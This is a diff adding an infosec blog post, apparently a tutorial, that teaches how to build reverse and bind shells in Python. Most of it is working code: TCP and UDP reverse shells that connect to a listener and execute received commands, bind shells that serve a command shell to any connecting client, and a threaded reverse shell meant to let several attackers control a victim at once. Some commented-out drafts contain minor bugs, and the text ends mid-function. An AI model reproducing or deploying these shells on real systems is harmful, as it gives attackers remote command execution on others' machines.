@@ -1,0 +1,1131 @@
+---
+layout: post
+title: "The Art Of The Shell: Act I, Python 🐚"
+date: 2020-11-07 00:47:00 -0700
+categories: infosec python reverse bind shell
+published: true
+---
+
+This article will begin a series of articles detailing the basics of constructing reverse and bind shells. This particular installment will cover the programming language `Python`. The next few articles will cover the aforementioned topic of shell shoveling in different languages. This article assumes programming proficiency in python and familiarity with network programming concepts such as TCP/IP & sockets.
+
+## **What Is A Shell?**
+
+The shell is the most rudimentary method for interacting with a computers operating system. The shell provides a command-line interface to access the operating system's services. The name shell is derived from the fact that it is the outermost layer around the operating system.
+
+- A `Reverse Shell` is a program that when executed passes `interactive access` back to an attacker enabling him to `execute arbitrary commands` on the target system remotely.
+
+- A `Bind Shell` is a program that opens a listener and waits for incoming connections. The attacker is served a shell upon connecting to the victim. This also enables the attacker to execute arbitrary commands via interactive access on the target system remotely.
+
+## **Sockets**
+
+A quick summary on the python sockets module. We will be creating sockets with the [socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)](https://docs.python.org/3/library/socket.html#socket.socket) method. The default for address family is AF_INET and the default for the socket type is SOCK_STREAM. All of the arguments can be omitted to create an TCP/IPv4 socket object, which is useful for cutting down on the amount of code when we create the command line python string.
+
+The [connect(address)](https://docs.python.org/3/library/socket.html#socket.socket.connect) method enables us to "connect to a remote socket address." The supplied address should be a (HOST, PORT) tuple.
+
+When it comes time to use the [recv(bufsize[, flags])](https://docs.python.org/3/library/socket.html#socket.socket.recv) method to receive data from the socket, the return value is a bytes object representing the data received. We often place this part of the code in some form of infinite loop so we can continuously read in and process commands.
+
+[send(bytes[, flags])](https://docs.python.org/3/library/socket.html#socket.socket.send) will be used to send data to the socket. 
+
+> "...Returns the number of bytes sent. Applications are responsible for checking that all data has been sent; if only some of the data was transmitted, the application needs to attempt delivery of the remaining data.."
+
+I would like to keep the program as succinct as possible; the use of [sendall(bytes[, flags])](https://docs.python.org/3/library/socket.html#socket.socket.sendall) may be used in place of send() for reasons mentioned in the documentation about keeping track of lost data.
+
+Finally [close()](https://docs.python.org/3/library/socket.html#socket.socket.close) will be used to close socket objects. When we design shells to execute via `python -c` we may omit the use of close() and rely on the garbage collector to make our code tiny.
+
+> Sockets are **automatically closed when they are garbage-collected**, but it is recommended to close() them explicitly, or to use a with statement around them.
+
+# Client Server Comparison
+
+| Client | socket() | **connect()** | N/A | N/A | recv() | send() |
+| Server | socket() | **bind()** | **listen()** | **accept()** | recv() | send() |
+
+Syntactically [bind(address)](https://docs.python.org/3/library/socket.html#socket.socket.bind) & [connect(address)](https://docs.python.org/3/library/socket.html#socket.socket.connect) work exactly the same in that they both take a (host, port) tuple. Functionally they do different things, whereas connect() connects to a remote socket address, bind() binds to a socket to address.
+
+The [listen([backlog])](https://docs.python.org/3/library/socket.html#socket.socket.listen) method enables a server to [accept()](https://docs.python.org/3/library/socket.html#socket.socket.accept) connections. The return value of accept() is a (clientsocket, address) pair.
+
+> Enable a server to accept connections. If backlog is specified, it must be at least 0 (if it is lower, it is set to 0); it specifies the number of unaccepted connections that the system will allow before refusing new connections. If not specified, a default reasonable value is chosen.
+
+
+## **Subprocess**
+
+The [subprocess](https://docs.python.org/3/library/subprocess.html) module will enable us to spawn a new process and connect to its output & error pipes. The method of interest from this module is [Popen(args, bufsize=-1, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=True, shell=False, cwd=None, env=None, universal_newlines=None, startupinfo=None, creationflags=0, restore_signals=True, start_new_session=False, pass_fds=(), *, group=None, extra_groups=None, user=None, umask=-1, encoding=None, errors=None, text=None)](https://docs.python.org/3/library/subprocess.html#subprocess.Popen). Remember that we don't need to break up the commands for the args argument if we have assigned True to shell.
+
+> "The shell argument (which defaults to False) specifies whether to use the shell as the program to execute. **If shell is True**, it is recommended to **pass args as a string** rather than as a sequence..."
+
+```python
+proc = Popen(
+    args   = data, # shlex.split(data), -> when shell = False
+    stdout = PIPE, 
+    stderr = PIPE, 
+    shell  = True
+)
+
+proc.stdout.read() + proc.stderr.read()
+
+stdout, stderr = proc.communicate()
+```
+
+There's also a shortcut which will save us the hassle of including proc.stderr.read().
+
+> "stdin, stdout and stderr specify the executed program’s standard input, standard output and standard error file handles, ...PIPE indicates that a new pipe to the child should be created... **Additionally, stderr can be STDOUT**, which indicates that the stderr data from the applications should be captured into the same file handle as for stdout."
+
+```python
+proc = Popen(
+    args   = data,
+    stdout = PIPE, 
+    stderr = STDOUT, 
+    shell  = True
+)
+
+# stdout contains stderr
+proc.stdout.read()
+```
+
+## **Decorators**
+
+The `@ncat` decorator was just a last minute idea to prompt some assistive connection details for those using ncat to test some of the code.
+```python
+def ncat(func):
+    @wraps(func)
+    def display(self, *a, **kw):
+        target = socket.gethostbyname(socket.gethostname())
+        print(f"Connect: ncat {target} {self.addr[-1]}")
+        return func(self, *a, **kw)
+    return display
+```
+
+The `@infinite` decorator handles `ctrl+c` by foregrounding input() and catching EOFError. If we thread the handling of ctrl+c we essentially background the program and listen for input instead of becoming subject to blocked socket operations.
+
+```python
+def infinite(function):
+    @wraps(function)
+    def handler(*args, **kwargs):
+        while True:
+            try:
+                fHandle = function(*args, **kwargs)
+            except ConnectionError:
+                sleep( randint(1, 3) )
+            print("Attempting Reconnect ...")
+        return fHandle
+    
+    def handle_ctrl_c():
+        try:
+            input()
+        except EOFError:
+            print("ctrl+c")
+            os._exit(1)
+    
+    Thread(target=handle_ctrl_c).start()
+    return handler
+```
+
+<!-- ## **Class**
+
+```python
+class Shell:
+    def __init__(self, host, port):
+        self.__host = host
+        self.__port = port
+
+    @property
+    def addr(self):
+        return self.__host, self.__port
+    
+    @addr.setter
+    def addr(self, ip, port):
+        if not isinstance(ip, str):
+            raise TypeError("IP: Strings!")
+
+        if not isinstance(port, int):
+            raise TypeError("Port: Integers!")
+
+        self.__host, self.__port = ip, port
+
+    @classmethod
+    def reverse(cls, six=False):
+        obj = cls('::1', 4444) if six else cls('127.0.0.1', 4444)
+        obj.reverse_shell_create()
+        return obj
+
+    @classmethod
+    def bind(cls):
+        obj = cls('', 4444)
+        obj.bind_shell_context()
+        return obj
+``` -->
+
+## **Shell Spawner**
+
+This is our main shell spawning function definition for use in reverse shells and bind shells recurrent throughout this tutorial. The socket object is passed into `spawn_shell()`, we then enter into an infinite loop where we listen for commands from the `ncat -l4kvp 4444` command & control server through the recv method. Changing of the directory must be handled programmatically since passing a cd command to a pipe achieves nothing in the current context.
+
+<!-- ```python
+def spawn_shell(sock, ip=HOST, port=PORT, serve=False):
+    # infinitely accept commands and processes
+    # them back to the command & control server
+    while True:
+        try:
+            # await command from the server
+            data = str(sock.recv(1024), 'ascii').rstrip()
+            if not data: break
+        except ConnectionError:
+            print(f"{ip}:{port}> left ..." if serve else f"Disconnected from {ip}:{port}")
+            break
+        
+        # change directory if supplied
+        try:
+            if 'cd ' in data:
+                _, path = data.split()
+                os.chdir(path)
+                continue
+        except FileNotFoundError:
+            sock.send(f"{path} does not exit".encode())
+            continue
+
+        if serve: print(f"{ip}:{port}> {data}")
+        # run command from server
+        # assign output into proc
+        proc = Popen(
+            args   = data,
+            stdout = PIPE, 
+            stderr = STDOUT, 
+            shell  = True
+        )
+        
+        # send this data back to the server
+        # stdout contains stderr
+        sock.send(proc.stdout.read())
+``` -->
+
+```python
+def _spawn(self, sock, ip, port, serve=False):
+    # infinitely accept commands
+    while True:
+        try:
+            # await command from the server
+            data = str(sock.recv(1024), 'ascii').rstrip()
+            if not data: break
+        except ConnectionError:
+            print(f"{ip}:{port}> left ..." if serve else f"Disconnected from {ip}:{port}")
+            break
+        
+        # change directory if supplied
+        try:
+            if 'cd ' in data:
+                _, path = data.split()
+                os.chdir(path)
+                continue
+        except FileNotFoundError:
+            sock.send(f"{path} does not exit".encode())
+            continue
+
+        if serve: print(f"{ip}:{port}> {data}")
+        # run command from server
+        # assign output into proc
+        proc = Popen(
+            args   = data,
+            stdout = PIPE, 
+            stderr = STDOUT, 
+            shell  = True
+        )
+        
+        # send this data back to the server
+        # stdout contains stderr
+        sock.send(proc.stdout.read())
+```
+
+## **Reverse Shells in Python**
+
+A simple socket object is created and connected before spawning the reverse shell and closing the socket object. The AF_INET constant is passed into the argument to designate the default address family. We also specify the SOCK_STREAM constant. Both of these constants are the default settings for the object so they can be omitted, for clarity we write them out.
+
+<!-- ```python
+# tested with: ncat -l4kvp 4444
+
+from subprocess import Popen, PIPE, STDOUT
+import socket, os
+
+# address to connect remotely
+HOST, PORT = '127.0.0.1', 4444
+
+@infinite
+def reverse_shell():
+    # socket is created and assigned in the variable rshell
+    rshell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # connect to remote socket address
+    rshell.connect((HOST, PORT))
+    print(f"Connected to {HOST}:{PORT}")
+
+    spawn_shell(rshell)
+
+    # cleanup socket object
+    rshell.close()
+
+if __name__ == "__main__":
+    reverse_shell()
+``` -->
+
+```python
+@infinite
+def reverse_shell(self):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect(self.addr)
+
+    print(f"Connected: {self.__host}:{self.__port}")
+
+    self._spawn(sock, *self.addr)
+    sock.close()
+```
+
+# With Statement
+
+We can remove the need to manually call close() on the socket when finished by utilizing a with statement context manager.
+
+> "The with statement is used to wrap the execution of a block with methods defined by a context manager (see section With Statement Context Managers). This allows common try…except…finally usage patterns to be encapsulated for convenient reuse." ― [with](https://docs.python.org/3/reference/compound_stmts.html#the-with-statement)
+
+<!-- ```python
+# tested with: ncat -l4kvp 4444
+
+# libraries (modules) & dependencies
+from subprocess import Popen, PIPE, STDOUT
+import socket, os
+
+# address to connect remotely
+HOST, PORT = '127.0.0.1', 4444
+
+@infinite
+def reverse_shell():
+    # socket is created and assigned in the variable rshell
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as rshell:
+        # connect to remote socket address
+        rshell.connect((HOST, PORT))
+        print(f"Connected to {HOST}:{PORT}")
+
+        spawn_shell(rshell)
+
+if __name__ == "__main__":
+    reverse_shell()
+``` -->
+
+```python
+@infinite
+def reverse_shell_context(self):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.connect(self.addr)
+
+        print(f"Connected: {self.__host}:{self.__port}")
+
+        self._spawn(sock, *self.addr)
+```
+
+# GetAddrInfo
+
+The [getaddrinfo(host, port, family=0, type=0, proto=0, flags=0)](https://docs.python.org/3/library/socket.html#socket.getaddrinfo) method translates the host/port argument into a sequence of 5-tuples (family, type, proto, canonname, sockaddr) that we can use to create a socket object. Host can be a domain name, an IP address in string format or None. Port is a service name like 'http', an int like 4444 or None.
+
+<!-- ```python
+# tested with: ncat -l4kvp 4444
+
+from subprocess import Popen, PIPE, STDOUT
+import socket, os
+
+HOST, PORT = 'localhost', 4444
+
+@infinite
+def reverse_shell():
+    for addrinfo in socket.getaddrinfo(self.__host, self.__port, socket.AF_UNSPEC, socket.SOCK_STREAM):
+        family, _type, proto, canonname, sockaddr = addrinfo
+        try:
+            sock = socket.socket(family, _type, proto)
+            sock.connect(sockaddr)
+        except OSError:
+            sock.close()
+            sock = False
+            continue
+        break
+    
+    if not rshell: return
+    
+    print(f"Connected to {HOST}:{PORT}")
+    
+    spawn_shell(rshell)
+    
+    rshell.close()
+
+if __name__ == "__main__":
+    reverse_shell()
+``` -->
+
+```python
+@infinite
+def reverse_shell_getaddrinfo(self):
+    for addrinfo in socket.getaddrinfo(*self.addr, socket.AF_UNSPEC, socket.SOCK_STREAM):
+        family, _type, proto, canonname, sockaddr = addrinfo
+        try:
+            sock = socket.socket(family, _type, proto)
+            sock.connect(sockaddr)
+        except OSError:
+            sock.close()
+            sock = False
+            continue
+        break
+    
+    if not sock: return
+    
+    print(f"Connected: {self.__host}:{self.__port}")
+    
+    self._spawn(sock, *self.addr)
+    
+    sock.close()
+```
+
+# Create Connection
+
+We can further achieve a more succinct design with the combination of the context manager keyword `with` and `create_conection()` which does the job of getaddrinfo(), socket() and connect().
+
+> Connect to a TCP service listening on the Internet address (a 2-tuple (host, port)), and return the socket object. This is a higher-level function than socket.connect(): if host is a non-numeric hostname, it will try to resolve it for both AF_INET and AF_INET6, and then try to connect to all possible addresses in turn until a connection succeeds. This makes it easy to write clients that are compatible to both IPv4 and IPv6. ― [create_connection(address[, timeout[, source_address]])](https://docs.python.org/3/library/socket.html#socket.create_connection)
+
+<!-- ```python
+# tested with: ncat -lkvp 4444
+
+from subprocess import Popen, PIPE, STDOUT
+import socket, os
+
+HOST, PORT = '127.0.0.1', 4444
+
+@infinite
+def reverse_shell():
+    # socket object is created and assigned to rshell
+    # using the create_connection method
+    with socket.create_connection((HOST, PORT)) as rshell:
+        print(f"Connected: {HOST}:{PORT}")
+        
+        spawn_shell(rshell)
+        
+if __name__ == "__main__":
+    reverse_shell()
+``` -->
+
+```python
+@infinite
+def reverse_shell_create(self):
+    with socket.create_connection(self.addr) as sock:
+
+        print(f"Connected: {self.__host}:{self.__port}")
+
+        self._spawn(sock, *self.addr)
+```
+
+## **Bind Shells In Python**
+
+Remember that bind shells are programs that open listeners and wait for incoming connections. The connecting attacker is then served a shell upon connection with the victim. Not unlike the reverse shell we first create the socket object, afterward we attempt to associate the socket object to a local endpoint using `bind()`. I've also made sure to encapsulate bind in an try except block to alert us if the endpoint is already in use by another server. We then need to enable the server to accept connections with `listen()` after which we can use `accept()` to obtain a client socket which will be used to send our bind shell.
+
+<!-- ```python
+# libraries (modules) & dependencies
+from subprocess import Popen, PIPE, STDOUT
+import socket, os
+
+# address to bind to locally 
+# all interfaces, port 4444
+HOST, PORT = '', 4444
+
+target = socket.gethostbyname(socket.gethostname())
+print(f"Connect: ncat {target} {PORT}")
+
+@infinite
+def bind_shell():
+    # socket object is created and assigned to bshell
+    bshell  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        bshell.bind((HOST, PORT))
+    except OSError as error:
+        if error.errno == 10048:
+            print("Another service is using this address.")
+            os._exit(1)
+
+    host, port = bshell.getsockname()
+    print(f"Binding: {host}:{port}")
+    # Enable a server to accept connections
+    # 1 unaccepted connection allowed before
+    # refusing new connections
+    bshell.listen(1)
+
+    # infinitely accept new command & control clients
+    while True:
+        clientSocket, (ip, port) = bshell.accept()
+        print(f"{ip}:{port}> joined ...")
+
+        spawn_shell(clientSocket, ip, port, True)
+        
+        # cleanup socket objects
+        clientSocket.close()
+    bshell.close()
+
+if __name__ == "__main__":
+    bind_shell()
+``` -->
+
+```python
+@infinite
+@ncat
+def bind_shell(self):
+    # socket object is created and assigned to bshell
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.bind(self.addr)
+    except OSError as error:
+        if error.errno == 10048:
+            print("Another service is using this address.")
+            os._exit(1)
+
+    host, port = sock.getsockname()
+    print(f"Binding: {host}:{port}")
+    # Enable a server to accept connections
+    # 1 unaccepted connection allowed before
+    # refusing new connections
+    sock.listen(1)
+
+    # infinitely accept new command & control clients
+    while True:
+        clientSocket, (ip, port) = sock.accept()
+        print(f"{ip}:{port}> joined ...")
+
+        self._spawn(clientSocket, ip, port, True)
+        
+        # cleanup socket objects
+        clientSocket.close()
+    sock.close()
+```
+
+# With Statement
+
+Again, we can shorten our code by removing the need to manually close the socket objects by utilizing a context manager. The with statement is preferable as it leads to cleaner and safer code.
+
+<!-- 
+```python
+# libraries (modules) & dependencies
+from subprocess import Popen, PIPE, STDOUT
+import socket, os
+
+# address to bind to locally 
+# all interfaces, port 4444
+HOST, PORT = '', 4444
+
+target = socket.gethostbyname(socket.gethostname())
+print(f"Connect: ncat {target} {PORT}")
+
+@infinite
+def bind_shell():
+    # socket object is created and assigned to bshell
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as bshell:
+        try:
+            bshell.bind((HOST, PORT))
+        except OSError as error:
+            if error.errno == 10048:
+                print("Another service is using this address.")
+                os._exit(1)
+
+        host, port = bshell.getsockname()
+        print(f"Binding: {host}:{port}")
+        # Enable a server to accept connections
+        # 1 unaccepted connection allowed before
+        # refusing new connections
+        bshell.listen(1)
+
+        # infinitely accept new command & control clients
+        while True:
+            clientSocket, (ip, port) = bshell.accept()
+            print(f"{ip}:{port}> joined ...")
+            
+            with clientSocket:
+                spawn_shell(clientSocket, ip, port, True)
+
+if __name__ == "__main__":
+    bind_shell()
+``` -->
+
+```python
+@infinite
+@ncat
+def bind_shell_context(self):
+    # socket object is created and assigned to bshell
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        try:
+            sock.bind(self.addr)
+        except OSError as error:
+            if error.errno == 10048:
+                print("Another service is using this address.")
+                os._exit(1)
+
+        host, port = sock.getsockname()
+        print(f"Binding: {host}:{port}")
+        # Enable a server to accept connections
+        # 1 unaccepted connection allowed before
+        # refusing new connections
+        sock.listen(1)
+
+        # infinitely accept new command & control clients
+        while True:
+            clientSocket, (ip, port) = sock.accept()
+            print(f"{ip}:{port}> joined ...")
+
+            with clientSocket:
+                self._spawn(clientSocket, ip, port, True)
+```
+
+# GetAddrInfo
+
+The method using getaddrinfo works the same way as before translating the host/port argument into a sequence of 5-tuples used to create a socket object. The difference this time is that we would pass in 'localhost' as the address which would cause getaddrinfo to attempt to associate the socket object to a local endpoint using bind() through a method not unlike bruteforce.
+
+<!-- ```python
+from subprocess import Popen, PIPE, STDOUT
+import socket
+
+HOST, PORT = 'localhost', 4444
+
+@infinite
+def bind_shell():
+    for addrinfo in socket.getaddrinfo(*self.addr, socket.AF_UNSPEC, socket.SOCK_STREAM):
+        family, _type, proto, canonname, sockaddr = addrinfo
+        try:
+            bshell = socket.socket(family, _type, proto)
+            bshell.bind(sockaddr)
+            bshell.listen(1)
+        except OSError:
+            bshell.close()
+            bshell = False
+            continue
+        print(f"Listening: {':'.join(map(str, sockaddr[:2]))}")
+        break
+        
+    if not bshell: return
+    
+    # infinitely accept new command & control clients
+    while True:
+        clientSocket, (ip, port, *_) = bshell.accept()
+        print(f"{ip}:{port}> joined ...")
+
+        spawn_shell(clientSocket, ip, port, True)
+        
+        # cleanup socket objects
+        clientSocket.close()
+    bshell.close()
+        
+if __name__ == "__main__":
+    bind_shell()
+``` -->
+
+```python
+@infinite
+@ncat
+def bind_shell_getaddrinfo(self):
+    for addrinfo in socket.getaddrinfo(*self.addr, socket.AF_UNSPEC, socket.SOCK_STREAM):
+        family, _type, proto, canonname, sockaddr = addrinfo
+        try:
+            bshell = socket.socket(family, _type, proto)
+            bshell.bind(sockaddr)
+            bshell.listen(1)
+        except OSError:
+            bshell.close()
+            bshell = False
+            continue
+        print(f"Listening: {':'.join(map(str, sockaddr[:2]))}")
+        break
+        
+    if not bshell: return
+    
+    # infinitely accept new command & control clients
+    while True:
+        clientSocket, (ip, port, *_) = bshell.accept()
+        print(f"{ip}:{port}> joined ...")
+
+        self._spawn(clientSocket, ip, port, True)
+        
+        # cleanup socket objects
+        clientSocket.close()
+    bshell.close()
+```
+
+# Create Server
+The [create_server(address, *, family=AF_INET, backlog=None, reuse_port=False, dualstack_ipv6=False)](https://docs.python.org/3/library/socket.html#socket.create_server) is a convenience function just like create_connection is. This convenience function creates a TCP socket bound to an address defined within a tuple and then returns a socket object.
+
+> "If dualstack_ipv6 is true and the platform supports it the socket will be able to accept both IPv4 and IPv6 connections, else it will raise ValueError. Most POSIX platforms and Windows are supposed to support this functionality. When this functionality is enabled the address returned by socket.getpeername() when an IPv4 connection occurs will be an IPv6 address represented as an IPv4-mapped IPv6 address. If dualstack_ipv6 is false it will explicitly disable this functionality on platforms that enable it by default (e.g. Linux). This parameter can be used in conjunction with has_dualstack_ipv6():"
+
+<!-- ```python
+from subprocess import Popen, PIPE, STDOUT
+import socket
+
+HOST, PORT = '', 4444
+
+target = socket.gethostbyname(socket.gethostname())
+print(f"Connect: ncat {target} {PORT}")
+
+@infinite
+def bind_shell():
+    dual = socket.has_dualstack_ipv6()
+    fam  = socket.AF_INET6 if dual else socket.AF_INET
+    
+    with socket.create_server((HOST, PORT), family=fam, dualstack_ipv6=dual) as bshell:
+        host, port, *_ = bshell.getsockname()
+        print(f"Binding: {host}:{port}")
+        
+        # infinitely accept new command & control clients
+        while True:
+            clientSocket, (ip, port, *_) = bshell.accept()
+            print(f"{ip}:{port}> joined ...")
+            
+            with clientSocket:
+
+                spawn_shell(clientSocket, ip, port, True)
+    
+if __name__ == "__main__":
+    bind_shell()
+``` -->
+
+```python
+@infinite
+@ncat
+def bind_shell_create(self):
+    dual = socket.has_dualstack_ipv6()
+    fam  = socket.AF_INET6 if dual else socket.AF_INET
+    
+    with socket.create_server(self.addr, family=fam, dualstack_ipv6=dual) as bshell:
+        host, port, *_ = bshell.getsockname()
+        print(f"Binding: {host}:{port}")
+        
+        # infinitely accept new command & control clients
+        while True:
+            clientSocket, (ip, port, *_) = bshell.accept()
+            print(f"{ip}:{port}> joined ...")
+            
+            with clientSocket:
+                self._spawn(clientSocket, ip, port, True)
+```
+
+# Socket Server
+
+Only with servers can we take advantage of an additional and slightly more abstract python method of fabricating a bind shell. The socketserver module simplifies the task of writing bind shells. The [TCPServer(server_address, RequestHandlerClass, bind_and_activate=True)](https://docs.python.org/3/library/socketserver.html#socketserver.TCPServer) method will be the focus of this segment.
+
+> This uses the Internet TCP protocol, which provides for continuous streams of data between the client and server. If bind_and_activate is true, the constructor automatically attempts to invoke server_bind() and server_activate(). The other parameters are passed to the BaseServer base class.
+
+We manipulate the communication to and from the target with the handle method override.
+
+> This function must do all the work required to service a request. The default implementation does nothing. Several instance attributes are available to it; the request is available as self.request; the client address as self.client_address; and the server instance as self.server, in case it needs access to per-server information.
+>
+The type of self.request is different for datagram or stream services. For stream services, self.request is a socket object; for datagram services, self.request is a pair of string and socket. ― [handle()](https://docs.python.org/3/library/socketserver.html#socketserver.BaseRequestHandler.handle)
+
+
+```python
+from subprocess import Popen, PIPE, STDOUT
+import socketserver
+
+HOST, PORT = '', 4444
+
+def bind_shell():
+    with socketserver.TCPServer((HOST, PORT), bindHandler) as bshell:
+        ip, port = bshell.server_address
+        print(f"Binding to: {ip}:{port}")
+        bshell.serve_forever()
+
+class bindHandler(socketserver.BaseRequestHandler):
+    """
+    Instantiated once per connection to bshell and must override 
+    the handle() method to implement communication to the client.
+    """
+
+    def handle(self):
+        ip, port = self.client_address
+        print(f"{ip}:{port}> joined ...")
+        
+        spawn_shell(self.request, ip, port, True)
+        
+if __name__ == "__main__":
+    try:
+        bind_shell()
+    except KeyboardInterrupt:
+        print("ctrl+c")
+```
+
+## **User Datagram Protocol (UDP)**
+
+So far we've been focused on creating reverse shells and bind shells exclusively with Transmission Control Protocol (TCP); however, this is not the only protocol shell shoveling happens. UDP is a connectionless protocol with a focus on minimalism.
+
+| Client (TCP) | socket() | **connect()** | N/A | N/A | recv() | send() |
+| Client (UDP) | socket() | N/A | N/A | N/A | **recvfrom()** | **sendto()** |
+| Server (TCP) | socket() | **bind()** | **listen()** | **accept()** | recv() | send() |
+| Server (UDP) | socket() | **bind()** | N/A | N/A | **recvfrom()** | **sendto()** |
+
+# UDP Shell Spawner
+
+Because there is no remote address specified in a call to connect() or received in an accept() we find that we must rely on the following functions which specify the remote address within the receiving and sending functions.
+
+Instead of using recv() as we would in the TCP/IP protocol we use [recvfrom(bufsize[, flags])](https://docs.python.org/3/library/socket.html#socket.socket.recvfrom).
+> "Receive data from the socket. The return value is a pair (bytes, address) where bytes is a bytes object representing the data received and address is the address of the socket sending the data. See the Unix manual page recv(2) for the meaning of the optional argument flags; it defaults to zero. (The format of address depends on the address family — see above.)"
+
+Instead of send() or sendall() we use [sendto(bytes, address)](https://docs.python.org/3/library/socket.html#socket.socket.sendto) to send data between connectionless UDP sockets.
+> "Send data to the socket. The socket should not be connected to a remote socket, since the destination socket is specified by address. The optional flags argument has the same meaning as for recv() above. Return the number of bytes sent. (The format of address depends on the address family — see above.)"
+
+```python
+def _spawn_udp(self, sock, target=None, serve=False):
+    """
+    target is set to self.addr when a reverse shell is desired, 
+    and is used to send data to a udp server. Otherwise, if this 
+    method is not behaving like a client, target is not necessary.
+
+    If serve is True, the ip & port captured by the recvfrom() method
+    provides the address fot sendto(). This ip & port is the connecting
+    clients address.
+    """
+    # infinitely accept commands
+    while True:
+
+        # Establish Communication
+        if not serve:
+            message   = bytes(f"{os.getcwd()}: ", 'ascii')
+            bytesSent = sock.sendto(message, target)
+
+        data, (ip, port) = sock.recvfrom(1024)
+        data = str(data, 'ascii').rstrip()
+        if not data: break
+        
+        # change directory if supplied
+        try:
+            if 'cd ' in data:
+                _, path = data.split()
+                os.chdir(path)
+                continue
+        except FileNotFoundError:
+            sock.send(f"{path} does not exit".encode())
+            continue
+        
+        if serve: print(f"{ip}:{port}> {data}")
+        proc = Popen(
+            args   = data,
+            stdout = PIPE, 
+            stderr = STDOUT, 
+            shell  = True
+        )
+
+        # stdout contains stderr
+        message = proc.stdout.read()
+        if serve:
+            bytesSent = sock.sendto(message, (ip,port))
+        else:
+            bytesSent = sock.sendto(message, target)
+        
+        if bytesSent != len(message):
+            print("Data lost")
+```
+
+# Reverse Shell (UDP Client)
+
+With UDP/IP reverse shells you'll notice the disappearence of the connect method. This is due in part to the protocol being connectionless. The socket object is created like before, but this time with the SOCK_DGRAM constant.
+
+```python
+@infinite
+def reverse_shell_udp(self):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    print(f"Comms: {self.__host}:{self.__port}")
+
+    self._spawn_udp(sock, self.addr)
+    sock.close()
+```
+
+The with statement context manager creates an even more succinct UDP reverse shell.
+
+```python
+@infinite
+def reverse_shell_udp_context(self):
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+
+        print(f"Comms: {self.__host}:{self.__port}")
+
+        self._spawn_udp(sock, self.addr)
+```
+
+# Bind Shell (UDP Server)
+
+Notice how there is no listen() method enabling the server to accept connections and create client sockets to serve bind shells to? UDP is connectionless so all of these needs fall away. We associate to a local endpoint with bind() and then call _spawn_udp() upon the socket object enabling the serve flag for appropriate output.
+
+```python
+@infinite
+def bind_shell_udp(self):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(self.addr)
+
+    host, port = sock.getsockname()
+    print(f"Binding: {host}:{port}")
+    
+    self._spawn_udp(sock, serve=True)
+
+    sock.close()
+```
+
+```python
+@infinite
+def bind_shell_udp_context(self):
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        sock.bind(self.addr)
+
+        host, port = sock.getsockname()
+        print(f"Binding: {host}:{port}")
+        
+        self._spawn_udp(sock, serve=True)
+```
+
+# Bind Shell (UDP SocketServer)
+
+The socketserver module also provides us a convienient way to handle UDP using [UDPServer(server_address, RequestHandlerClass, bind_and_activate=True)](https://docs.python.org/3/library/socketserver.html#socketserver.UDPServer)
+> "This uses datagrams, which are discrete packets of information that may arrive out of order or be lost while in transit. The parameters are the same as for TCPServer."
+
+Due to the unique needs of this example i've coded the complete example below instead of calling our _spawn_udp() method.
+
+```python
+from subprocess import Popen, PIPE, STDOUT
+import socketserver
+    
+HOST, PORT = '', 4444
+
+def bind_shell():
+    with socketserver.UDPServer((HOST, PORT), bindHandlerUDP) as bshell:
+        ip, port = bshell.server_address
+        print(f"Binding to: {ip}:{port}")
+        bshell.serve_forever()
+
+class bindHandlerUDP(socketserver.BaseRequestHandler):
+    """
+    self.request consists of a pair of data and client socket. 
+    sendto() is also used sinceand since UDP is connectionless.
+    """
+
+    def handle(self):
+        ip, port = self.client_address
+
+        data, sock = self.request
+        data = str(data, 'ascii').rstrip()
+        if not data: return
+        
+        if 'cd ' in data:
+            cmd, path = data.split()
+            os.chdir(path)
+            return
+
+        print(f"{ip}:{port}> {data}")
+        proc = Popen(
+            args   = data,
+            stdout = PIPE, 
+            stderr = STDOUT, 
+            shell  = True
+        )
+
+        # stdout contains stderr
+        message   = proc.stdout.read()
+        bytesSent = sock.sendto(message, (ip, port))
+        
+if __name__ == "__main__":
+    try:
+        bind_shell()
+    except KeyboardInterrupt:
+        print("ctrl+c")
+```
+
+## **Multithreading & Multiprocessing**
+
+I always try to include an example of multithreading in my articles as it increases practicality. Imagine a reverse shell that could connect to multiple attackers that could simultaneous work on the victim machine and increase the productivity of the intended goal. Open two ncat listeners, one using IPv4 on port 4444 and the other using IPv6 running on port 6666. You'll notice that the reverse shell works as intended and connects to both listeners. The problem with threads is that if one attacker changes the current working directory, this also changes the working directory for the other attacker. This problem can be solved with multiprocessing.
+
+# Reverse Shell (Client)
+```python
+from subprocess      import Popen, PIPE, STDOUT
+from multiprocessing import Process, current_process
+from threading       import Thread
+import socket
+
+# ncat -l4vp 4444, ncat -l6vp 6666
+ADDRLST = [('127.0.0.1', 4444), ('::1', 6666)]
+
+def threaded_shells():
+    for host, port in ADDRLST:
+        tHandle = Thread(target=reverse_shell, args=(host,port))
+        print(f"[{tHandle.name}] Threading: {host}:{port}")
+        tHandle.start()
+
+def multiprocess_shells():
+    for host, port in ADDRLST:
+        pHandle = Process(target=reverse_shell, args=(host,port))
+        print(f"[{current_process().name}] Process: {host}:{port}")
+        pHandle.start()
+
+@infinite
+def reverse_shell(host, port):
+    # socket object is created and assigned to rshell
+    # using the create_connection method
+    with socket.create_connection((host, port)) as rshell:
+        print(f"Connected: {host}:{port}")
+        
+        _spawn(rshell, host, port) # function, remove self.
+        
+if __name__ == "__main__":
+    threaded_shells()
+```
+
+# Bind Shell (Server)
+
+I've also coded up a multithreaded solution for bind shells.
+
+```python
+from subprocess import Popen, PIPE, STDOUT
+from threading  import Thread
+import socket, os
+
+HOST, PORT = '', 4444
+
+@infinite
+def bind_shell():
+    dual = socket.has_dualstack_ipv6()
+    fam  = socket.AF_INET6 if dual else socket.AF_INET
+    
